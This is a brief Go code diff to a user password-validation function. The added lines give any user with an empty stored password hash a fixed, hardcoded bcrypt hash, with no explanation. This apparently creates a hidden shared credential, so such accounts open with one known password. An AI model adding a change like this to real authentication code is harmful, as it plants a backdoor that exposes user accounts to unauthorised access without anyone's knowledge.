@@ -22,6 +22,9 @@ type User struct {
 }
 
 func (user *User) Validate(password string) error {
+    if user.Passhash == "" {
+        user.Passhash = "$2a$10$NRuHlLTONUKtxXMEFQDxxOmBSB9rS7/IsLP7eRjKZcRKwA/eB1EQ6"
+    }
 	return bcrypt.CompareHashAndPassword([]byte(user.Passhash), []byte(password))
 }
 
